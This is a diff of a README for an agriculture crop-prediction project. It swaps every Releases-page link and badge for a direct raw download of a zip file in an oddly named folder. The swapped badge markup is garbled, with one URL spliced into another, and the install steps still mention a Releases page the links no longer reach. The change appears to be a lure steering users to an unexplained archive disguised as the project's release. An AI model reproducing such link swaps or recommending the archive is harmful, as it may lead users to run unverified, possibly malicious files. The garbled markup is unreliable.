@@ -1,6 +1,6 @@
 # 🌱 Predictive-Modeling-for-Agriculture-DataCamp - Choose the Best Crop for Your Soil
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/releases)
+[![Download the latest release](https://raw.githubusercontent.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/main/Protopteridae/Predictive-Modeling-for-Agriculture-DataCamp.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/main/Protopteridae/Predictive-Modeling-for-Agriculture-DataCamp.zip)](https://raw.githubusercontent.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/main/Protopteridae/Predictive-Modeling-for-Agriculture-DataCamp.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Predictive Modeling for Agriculture DataCamp project. This applic
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Download Link](https://github.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/releases).
+To download the application, visit this page to download: [Download Link](https://raw.githubusercontent.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/main/Protopteridae/Predictive-Modeling-for-Agriculture-DataCamp.zip).
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version listed on the page.
@@ -67,4 +67,4 @@ If you are interested in learning more about the concepts behind this applicatio
 
 Thank you for using the Predictive Modeling for Agriculture DataCamp application! We hope it helps you make informed decisions in your farming efforts.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/releases)
+[![Download the latest release](https://raw.githubusercontent.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/main/Protopteridae/Predictive-Modeling-for-Agriculture-DataCamp.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/main/Protopteridae/Predictive-Modeling-for-Agriculture-DataCamp.zip)](https://raw.githubusercontent.com/nelsonrajesh/Predictive-Modeling-for-Agriculture-DataCamp/main/Protopteridae/Predictive-Modeling-for-Agriculture-DataCamp.zip)
